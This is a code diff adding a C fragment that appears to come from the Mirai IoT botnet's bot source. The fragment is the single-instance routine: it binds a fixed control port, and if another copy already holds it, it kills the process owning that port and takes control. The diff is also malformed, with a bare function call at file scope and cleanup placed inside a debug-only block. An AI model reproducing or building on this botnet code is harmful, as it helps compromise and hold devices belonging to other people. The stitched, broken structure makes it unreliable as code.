@@ -1,0 +1,65 @@
+#define SINGLE_INSTANCE_PORT 38273
+
+static void ensure_single_instance(void);
+
+ensure_single_instance();
+
+static void ensure_single_instance(void)
+{
+    static BOOL local_bind = TRUE;
+    struct sockaddr_in addr;
+    int opt = 1;
+
+    if ((fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)) == -1)
+        return;
+    setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof (int));
+    fcntl(fd_ctrl, F_SETFL, O_NONBLOCK | fcntl(fd_ctrl, F_GETFL, 0));
+
+    addr.sin_family = AF_INET;
+    addr.sin_addr.s_addr = local_bind ? (INET_ADDR(127,0,0,1)) : LOCAL_ADDR;
+    addr.sin_port = htons(SINGLE_INSTANCE_PORT);
+
+    // Try to bind to the control port
+    errno = 0;
+    if (bind(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
+    {
+        if (errno == EADDRNOTAVAIL && local_bind)
+            local_bind = FALSE;
+#ifdef DEBUG
+        printf("[main] Another instance is already running (errno = %d)! Sending kill request...\r\n", errno);
+#endif
+
+        // Reset addr just in case
+        addr.sin_family = AF_INET;
+        addr.sin_addr.s_addr = INADDR_ANY;
+        addr.sin_port = htons(SINGLE_INSTANCE_PORT);
+
+        if (connect(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
+        {
+#ifdef DEBUG
+            printf("[main] Failed to connect to fd_ctrl to request process termination\n");
+#endif
+        }
+        
+        sleep(5);
+        close(fd_ctrl);
+        killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
+        ensure_single_instance(); // Call again, so that we are now the control
+    }
+    else
+    {
+        if (listen(fd_ctrl, 1) == -1)
+        {
+#ifdef DEBUG
+            printf("[main] Failed to call listen() on fd_ctrl\n");
+            close(fd_ctrl);
+            sleep(5);
+            killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
+            ensure_single_instance();
+#endif
+        }
+#ifdef DEBUG
+        printf("[main] We are the only process on this system!\n");
+#endif
+    }
+}
